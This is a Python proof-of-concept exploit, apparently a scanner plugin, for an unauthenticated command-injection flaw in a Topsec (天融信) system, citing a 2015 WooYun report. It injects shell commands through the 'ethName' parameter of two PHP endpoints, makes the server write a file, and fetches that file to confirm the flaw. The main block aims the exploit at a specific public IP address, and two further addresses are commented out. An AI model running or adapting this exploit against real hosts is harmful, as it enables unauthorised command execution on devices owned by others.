#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
POC Name  : 天融信某系统前台无需登录命令执行2处
Author    :  a
mail      :  a@lcx.cc
refer     :  http://www.wooyun.org/bugs/wooyun-2015-0117616

"""

import urlparse
def assign(service, arg):
    if service == 'topsec':
        arr = urlparse.urlparse(arg)
        return True, '%s://%s/' % (arr.scheme, arr.netloc)
def audit(arg):
        
    payload='acc/bindipmac/static_restart_arp_action.php?ethName=%20|%20echo%20testvul%20>%20l.php%20|'
    target = arg + payload
    code, head, res, errcode, _ = curl.curl2(target)
    payload='acc/bindipmac/l.php'
    target = arg + payload
    code, head, res, errcode, _ = curl.curl2(target)
    if 'testvul' in res:
       security_hole(target)

    payload='acc/bindipmac/static_arp.php?ethName=%20|%20echo%20testvul%20>%20d.php%20|'
    target = arg + payload
    code, head, res, errcode, _ = curl.curl2(target)
    payload='acc/bindipmac/d.php'
    target = arg + payload
    code, head, res, errcode, _ = curl.curl2(target)
    if 'testvul' in res:
        security_hole(target)


if __name__ == '__main__':
    from dummy import *
    audit(assign('topsec', 'http://61.148.24.182/')[1])
    # audit(assign('topsec', 'http://218.206.217.19:8080/')[1])
    # audit(assign('topsec', 'http://61.54.222.39:8080/')[1])